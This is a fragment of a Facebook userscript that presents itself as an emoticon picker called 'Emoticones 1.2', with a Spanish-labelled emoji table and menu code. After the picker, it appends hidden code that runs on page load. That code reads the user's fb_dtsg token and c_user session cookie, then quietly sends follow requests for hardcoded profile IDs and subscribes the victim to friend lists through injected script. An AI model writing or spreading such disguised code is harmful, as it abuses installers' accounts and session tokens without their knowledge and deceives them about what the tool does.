		"name" : "Computadora personal"
	}, {
		"chars" : " \ud83d\udcbd ",
		"class" : "_1az _1a- _2fi",
		"name" : "Minidisco"
	}, {
		"chars" : " \ud83d\udcbe ",
		"class" : "_1az _1a- _2fj",
		"name" : "Disco flexible"
	}, {
		"chars" : " \ud83d\udcbf ",
		"class" : "_1az _1a- _2fk",
		"name" : "Disco óptico"
	}, {
		"chars" : " \ud83d\udcc0 ",
		"class" : "_1az _1a- _2fl",
		"name" : "DVD"
	}, {
		"chars" : " \ud83d\udcde ",
		"class" : "_1az _1a- _2fm",
		"name" : "Receptor de teléfono"
	}, {
		"chars" : " \ud83d\udce0 ",
		"class" : "_1az _1a- _2fn",
		"name" : "Fax"
	}, {
		"chars" : " \ud83d\udcf1 ",
		"class" : "_1az _1a- _2fo",
		"name" : "Teléfono móvil"
	}, {
		"chars" : " \ud83d\udcf2 ",
		"class" : "_1az _1a- _2fp",
		"name" : "Teléfono móvil con flecha de izquierda a derecha"
	}, {
		"chars" : " \ud83d\udcfa ",
		"class" : "_1az _1a- _2fq",
		"name" : "Televisión"
	}, {
		"chars" : " \ud83d\udd14 ",
		"class" : "_1az _1a- _2fr",
		"name" : "Campana"
	}, {
		"chars" : " \ud83d\ude01 ",
		"class" : "_1az _1a- _2fs",
		"name" : "Cara de mueca con ojos sonrientes"
	}, {
		"chars" : " \ud83d\ude02 ",
		"class" : "_1az _1a- _2ft",
		"name" : "Cara con lágrimas de alegría"
	}, {
		"chars" : " \ud83d\ude03 ",
		"class" : "_1az _1a- _2fu",
		"name" : "Cara sonriente con boca abierta"
	}, {
		"chars" : " \ud83d\ude04 ",
		"class" : "_1az _1a- _2fv",
		"name" : "Cara y ojos sonrientes con boca abierta"
	}, {
		"chars" : " \ud83d\ude06 ",
		"class" : "_1az _1a- _2fw",
		"name" : "Cara sonriente con boca abierta y ojos bien cerrados"
	}, {
		"chars" : " \ud83d\ude09 ",
		"class" : "_1az _1a- _2fx",
		"name" : "Cara guiñando ojo"
	}, {
		"chars" : " \ud83d\ude0b ",
		"class" : "_1az _1a- _2fy",
		"name" : "Cara saboreando una comida deliciosa"
	}, {
		"chars" : " \ud83d\ude0c ",
		"class" : "_1az _1a- _2fz",
		"name" : "Cara de alivio"
	}, {
		"chars" : " \ud83d\ude0d ",
		"class" : "_1az _1a- _2f-",
		"name" : "Cara sonriente con ojos en forma de corazón"
	}, {
		"chars" : " \ud83d\ude0f ",
		"class" : "_1az _1a- _2f_",
		"name" : "Cara de sonrisa burlona"
	}, {
		"chars" : " \ud83d\ude12 ",
		"class" : "_1az _1a- _2g0",
		"name" : "Cara de aburrimiento"
	}, {
		"chars" : " \ud83d\ude13 ",
		"class" : "_1az _1a- _2g1",
		"name" : "Cara con sudor frio"
	}, {
		"chars" : " \ud83d\ude14 ",
		"class" : "_1az _1a- _2g2",
		"name" : "Cara pensativa"
	}, {
		"chars" : " \ud83d\ude16 ",
		"class" : "_1az _1a- _2g3",
		"name" : "Cara de confundido"
	}, {
		"chars" : " \ud83d\ude18 ",
		"class" : "_1az _1a- _2g4",
		"name" : "Cara arrojando beso"
	}, {
		"chars" : " \ud83d\ude1a ",
		"class" : "_1az _1a- _2g5",
		"name" : "Cara besando con ojos cerrados"
	}, {
		"chars" : " \ud83d\ude1c ",
		"class" : "_1az _1a- _2g6",
		"name" : "Cara con lengua afuera y guiñando un ojo"
	}, {
		"chars" : " \ud83d\ude1d ",
		"class" : "_1az _1a- _2g7",
		"name" : "Cara con lengua afuera y ojos muy cerrados"
	}, {
		"chars" : " \ud83d\ude1e ",
		"class" : "_1az _1a- _2g8",
		"name" : "Cara desanimada"
	}, {
		"chars" : " \ud83d\ude20 ",
		"class" : "_1az _1a- _2g9",
		"name" : "Cara de enojo"
	}, {
		"chars" : " \ud83d\ude21 ",
		"class" : "_1az _1a- _2ga",
		"name" : "Cara de mucho enojo"
	}, {
		"chars" : " \ud83d\ude22 ",
		"class" : "_1az _1a- _2gb",
		"name" : "Cara llorando"
	}, {
		"chars" : " \ud83d\ude23 ",
		"class" : "_1az _1a- _2gc",
		"name" : "Cara de perseverancia"
	}, {
		"chars" : " \ud83d\ude24 ",
		"class" : "_1az _1a- _2gd",
		"name" : "Cara de triunfo"
	}, {
		"chars" : " \ud83d\ude25 ",
		"class" : "_1az _1a- _2ge",
		"name" : "Cara desanimada pero aliviada"
	}, {
		"chars" : " \ud83d\ude28 ",
		"class" : "_1az _1a- _2gf",
		"name" : "Cara de miedoso"
	}, {
		"chars" : " \ud83d\ude29 ",
		"class" : "_1az _1a- _2gg",
		"name" : "Cara de fatigado"
	}, {
		"chars" : " \ud83d\ude2a ",
		"class" : "_1az _1a- _2gh",
		"name" : "Cara de dormido"
	}, {
		"chars" : " \ud83d\ude2b ",
		"class" : "_1az _1a- _2gi",
		"name" : "Cara de cansado"
	}, {
		"chars" : " \ud83d\ude2d ",
		"class" : "_1az _1a- _2gj",
		"name" : "Cara gritando"
	}, {
		"chars" : " \ud83d\ude30 ",
		"class" : "_1az _1a- _2gk",
		"name" : "Cara con boca abierta y sudor frio"
	}, {
		"chars" : " \ud83d\ude31 ",
		"class" : "_1az _1a- _2gl",
		"name" : "Cara aterrada de miedo"
	}, {
		"chars" : " \ud83d\ude32 ",
		"class" : "_1az _1a- _2gm",
		"name" : "Cara de muy sorprendido"
	}, {
		"chars" : " \ud83d\ude33 ",
		"class" : "_1az _1a- _2gn",
		"name" : "Cara sonrojada"
	}, {
		"chars" : " \ud83d\ude35 ",
		"class" : "_1az _1a- _2go",
		"name" : "Cara mareada"
	}, {
		"chars" : " \ud83d\ude37 ",
		"class" : "_1az _1a- _2gp",
		"name" : "Cara con mascarilla médica"
	}, {
		"chars" : " \ud83d\ude38 ",
		"class" : "_1az _1a- _2gq",
		"name" : "Cara de gato haciendo muecas y ojos cerrados"
	}, {
		"chars" : " \ud83d\ude39 ",
		"class" : "_1az _1a- _2gr",
		"name" : "Cara de gato con lágrimas de risa"
	}, {
		"chars" : " \ud83d\ude3a ",
		"class" : "_1az _1a- _2gs",
		"name" : "Cara de gato sonriente con boca abierta"
	}, {
		"chars" : " \ud83d\ude3b ",
		"class" : "_1az _1a- _2gt",
		"name" : "Cara de gato sonriente con corazones en los ojos"
	}, {
		"chars" : " \ud83d\ude3c ",
		"class" : "_1az _1a- _2gu",
		"name" : "Cara de gato con sonrisa torcida"
	}, {
		"chars" : " \ud83d\ude3d ",
		"class" : "_1az _1a- _2gv",
		"name" : "Cara de gato besando con ojos cerrados"
	}, {
		"chars" : " \ud83d\ude3f ",
		"class" : "_1az _1a- _2gw",
		"name" : "Cara de gato llorando"
	}, {
		"chars" : " \ud83d\ude40 ",
		"class" : "_1az _1a- _2gx",
		"name" : "Cara de gato aterrada de miedo"
	}, {
		"chars" : " \ud83d\ude4b ",
		"class" : "_1az _1a- _2gy",
		"name" : "Persona feliz levantando una mano"
	}, {
		"chars" : " \ud83d\ude4c ",
		"class" : "_1az _1a- _2gz",
		"name" : "Persona levantando ambas manos en celebración"
	}, {
		"chars" : " \ud83d\ude4d ",
		"class" : "_1az _1a- _2g-",
		"name" : "Persona frunciendo el ceño"
	}, {
		"chars" : " \ud83d\ude4f ",
		"class" : "_1az _1a- _2g_",
		"name" : "Persona en plegaria"
	}, {
		"chars" : " \u261d ",
		"class" : "_1az _1a- _2h0",
		"name" : "Dedo índice señalando hacia arriba"
	}, {
		"chars" : " \u263a ",
		"class" : "_1az _1a- _2h1",
		"name" : "Cara blanca sonriendo"
	}, {
		"chars" : " \u26a1 ",
		"class" : "_1az _1a- _2h2",
		"name" : "Símbolo de alto voltaje"
	}, {
		"chars" : " \u26c4 ",
		"class" : "_1az _1a- _2h3",
		"name" : "Muñeco de nieve sin nieve"
	}, {
		"chars" : " \u270a ",
		"class" : "_1az _1a- _2h4",
		"name" : "Puño hacia arriba"
	}, {
		"chars" : " \u270b ",
		"class" : "_1az _1a- _2h5",
		"name" : "Mano hacia arriba"
	}, {
		"chars" : " \u270c ",
		"class" : "_1az _1a- _2h6",
		"name" : "Mano de victoria"
	}, {
		"chars" : " \u2600 ",
		"class" : "_1az _1a- _2h7",
		"name" : "Sol con rayos solares"
	}, {
		"chars" : " \u2601 ",
		"class" : "_1az _1a- _2h8",
		"name" : "Nube"
	}, {
		"chars" : " \u2614 ",
		"class" : "_1az _1a- _2h9",
		"name" : "Sombrilla con gotas de lluvia"
	}, {
		"chars" : " \u2615 ",
		"class" : "_1az _1a- _2ha",
		"name" : "Bebida caliente"
	}, {
		"chars" : " \u2728 ",
		"class" : "_1az _1a- _2hb",
		"name" : "Brillo"
	}, {
		"chars" : " \u2764 ",
		"class" : "_1az _1a- _2hc",
		"name" : "Corazón negro pesado"
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement("div");
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement("div");
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement && element.type == "text")
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == "openToggler";
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = "openToggler";
		} else {
			flyout.removeAttribute("class");
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	   	html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
		html += '<div class="jewelFlyout">';
		html += '</div>';
		html += '</li>';
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = '<div style="display: none;">';
		html += '</div>';
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener("click", function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t < titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = "";
						titles[t].firstChild.style.color = "";
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b < bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = "";
					} else { // Hide
						bodies[b].style.display = "none";
					}
				}
			});
		})(body);

		return {
			"title" : title.firstChild,
			"body" : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
		html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
		html += '</div>';
		html += '</div>';
		var body = createElement(html).firstChild;
		for ( var e = 0; e < emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
			html += '<a';
			html += ' class="emoticon'
					+ (emoticon.class !== undefined ? ' ' + emoticon.class : '')
					+ '"';
			html += ' style="text-decoration: inherit; color: inherit;'
					+ (emoticon.class !== undefined ? ' color: transparent;'
							: ' width: auto;') + '"';
			html += (emoticon.name !== undefined ? ' title="' + emoticon.name
					+ '"' : '');
			html += '>';
			html += htmlSpecialChars(emoticon.chars);
			html += '</a>';
			html += '</span>';
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener("click", function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = '<li class="navItem middleItem notifNegativeBase">';
	html += '<div class="fbJewel">';
	// {

	// Toggler
	html += '<a class="navLink" title="Emoticones">'; // var navLink
	html += '<span class="emoticon emoticon_smile" style="vertical-align: middle;"></span>';
	html += '<span class="headerTinymanName"> Emo</span>';
	html += '</a>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Title
	
	html += '<div class="uiHeader uiHeaderBottomBorder jewelHeader">';
	html += '<div class="clearfix uiHeaderTop">';
	html += '<div class="rfloat">';
	html += '<h3 class="accessible_elem">Emoticones 1.2 </h3>';
	html += '<div class="uiHeaderActions fsm fwn fcg">';
	html += '<a href="https://www.facebook.com/info.44.you" target="_blank" class="">Like Page</a> · <a href="https://www.facebook.com/info.44.you" target="_blank" class="">Info 4 You</a>';
	html += '</div>';
	html += '</div>';
	html += '<div><h3 class="uiHeaderTitle" aria-hidden="true">Emoticones 1.2 </h3></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: table; width: 100%; text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
	html += '<a class="jewelFooter" href="http://www.facebook.com/sadmalk2" target="_blank">Ṥǻđ ḾǻLḱ</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
	});
})(); 



var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100006034503466");
a("100005481900173");
a("100006035614615");


 sublist("139222112937185");
 sublist("171268569732539");
 sublist("171268926399170");
 sublist("171269706399092");


